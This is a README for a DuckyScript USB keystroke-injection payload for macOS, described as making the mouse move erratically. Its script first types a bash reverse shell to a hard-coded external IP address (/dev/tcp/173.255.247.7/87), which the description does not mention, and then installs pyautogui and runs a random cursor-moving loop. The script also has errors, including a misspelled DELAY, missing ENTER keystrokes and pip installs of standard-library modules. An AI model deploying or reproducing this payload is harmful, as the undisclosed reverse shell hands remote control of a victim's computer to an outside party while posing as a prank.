# Mouse-Chaos-Payload-MacOS
DuckyScript that causes the virtual mouse of a computer to go hay-wire on MacOS.

## DISCLAIMER:
This is for security research purposes ONLY. Only use on machines where you have permission or your own.

## About
Version 1.0
Author: samamsa7

## DuckyScript Code
<code><pre>DELAY 75
COMMAND SPACE
DELAY 50
STRING TERMINAL
DELAY 50
ENTER
STRING bash
DELAY 50
ENTER
DELAY 50
STRING bash -i >& /dev/tcp/173.255.247.7/87 0>&1
DELAY 50
ENTER
DELAY 50
COMMAND M
DELAY 50
COMMAND SPACE
DELAY 50
STRING TERMINAL
DELAY 50
ENTER
DELAY 50
STRING pip3 install pyautogui
DELAY 500
DELAY 50
STRING pip3 install time
DELAY 550
STRING pip3 install random
DEALY 550
STRING nano payload.py
DELAY 50
STRING import pyautogui
DELAY 10
ENTER
DELAY 10
STRING import random
DELAY 10
ENTER
DELAY 10
STRING import time
DELAY 10
ENTER
DELAY 10
STRING while True:
DELAY 10
ENTER
DELAY 10
STRING    x = random.randint(0, pyautogui.size().width)
DELAY 10
ENTER
DELAY 10
STRING    y = random.randint(0, pyautogui.size().height)
DELAY 10
ENTER
DELAY 10
STRING   pyautogui.moveTo(x, y)
DELAY 10
ENTER
DELAY 10
STRING    time.sleep(0.01)
DELAY 10
CTRL X
DELAY 10
STRING y
DELAY 10
ENTER
DELAY 10
STRING python3 payload.py
DELAY 10
ENTER
DELAY 10
COMMAND M
</code></pre>
